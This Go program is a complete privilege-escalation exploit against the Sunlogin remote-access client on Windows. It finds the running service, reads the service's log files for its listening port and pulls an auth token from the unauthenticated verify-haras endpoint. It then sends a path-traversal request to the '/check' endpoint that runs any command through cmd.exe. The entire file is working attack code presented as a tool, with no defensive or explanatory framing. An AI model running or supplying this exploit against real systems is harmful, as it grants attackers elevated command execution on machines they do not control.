package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net/url"
	"os"
	"os/exec"
	"regexp"
	"strconv"
	"strings"
	"time"

	"github.com/go-resty/resty/v2"
	"github.com/tidwall/gjson"
)

func runWindowsWithErr(cmd string) string {
	// fmt.Println("Running Windows cmd:" + cmd)
	result, err := exec.Command("cmd", "/c", cmd).Output()
	if err != nil {
		fmt.Println(err.Error())
		os.Exit(-1)
	}
	return strings.TrimSpace(string(result))
}

func GetLatestYear(path_arr []string) int {
	var max_year int
	for _, value := range path_arr {

		find_time := strings.Split(strings.Replace(strings.Replace(value, ".log", "", -1), "sunlogin_service.", "", -1), "-")
		time_1, err := strconv.Atoi(find_time[0])
		if err != nil {
			fmt.Println(err)
		} else {
			if time_1 > max_year {
				max_year = time_1
			}
		}
	}
	return max_year
}

func GetLatestTime(path_arr []string) int {
	var max_time int
	for _, value := range path_arr {
		find_time := strings.Split(strings.Replace(strings.Replace(value, ".log", "", -1), "sunlogin_service.", "", -1), "-")
		time_1, err := strconv.Atoi(find_time[1])
		if err != nil {
			fmt.Println(err)
		} else {
			if time_1 > max_time {
				max_time = time_1
			}
		}
	}
	return max_time
}

func GetCID(port string) string {
	client := resty.New().SetTimeout(60 * time.Second).SetTLSClientConfig(&tls.Config{InsecureSkipVerify: true})
	resp, err := client.R().EnableTrace().Get("http://127.0.0.1:" + port + "/cgi-bin/rpc?action=verify-haras")
	if err != nil {
		log.Println(err)
		return ""
	}
	str := resp.Body()
	body := string(str)
	verify := fmt.Sprintf("%s", gjson.Get(body, "verify_string"))
	return verify
}

func RunCmd(cmd string, port string) string {
	fmt.Println("开始提权：")
	client := resty.New().SetTimeout(60 * time.Second).SetTLSClientConfig(&tls.Config{InsecureSkipVerify: true})
	cmd = url.QueryEscape(cmd)
	client.Header.Set("Cookie", "CID="+GetCID(port))
	resp, err := client.R().EnableTrace().Get("http://127.0.0.1:" + port + "/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows\\system32\\cmd.exe+/c+" + cmd)

	if err != nil {
		log.Println(err)
		return ""
	}
	str := resp.Body()
	body := string(str)
	return body
}

func main() {
	cmd := flag.String("c", "cmd", "指定命令：whoami")
	flag.Parse()
	tasklist := runWindowsWithErr("tasklist")
	// fmt.Println(tasklist)
	if strings.Index(tasklist, "Sunlogin") != -1 {
		logfile_path := runWindowsWithErr("for /r C:/ %i in (sunlogin_service.*.log) do @echo %i")
		regexp_1 := regexp.MustCompile("sunlogin_service.(.*?).log")
		path_arr := regexp_1.FindAllString(logfile_path, -1)
		max_year := GetLatestYear(path_arr)
		least_year := strconv.Itoa(max_year)
		regexp_2 := regexp.MustCompile("sunlogin_service." + least_year + "(.*?).log")
		path2_arr := regexp_2.FindAllString(logfile_path, -1)
		max_time := GetLatestTime(path2_arr)
		least_time := strconv.Itoa(max_time)
		path3_arr := strings.Split(logfile_path, "\n")
		var log_file string
		for _, value := range path3_arr {
			if strings.Index(value, least_year+"-"+least_time) != -1 {
				log_file = value
				break
			}
		}
		data, err := ioutil.ReadFile(strings.TrimSpace(log_file))
		if err != nil {
			fmt.Println("File reading error", err)
			return
		}
		// fmt.Println("Contents of file:", string(data))
		regexp_3 := regexp.MustCompile("tcp:0.0.0.0:(.*?),")
		find_str := regexp_3.FindString(string(data))
		port := strings.Replace(strings.Replace(find_str, ",", "", -1), "tcp:0.0.0.0:", "", -1)
		fmt.Println("端口成功获取：" + port)
		fmt.Println(RunCmd(*cmd, port))

	} else {
		fmt.Println("sunlogin doesn't exist!")
	}
}
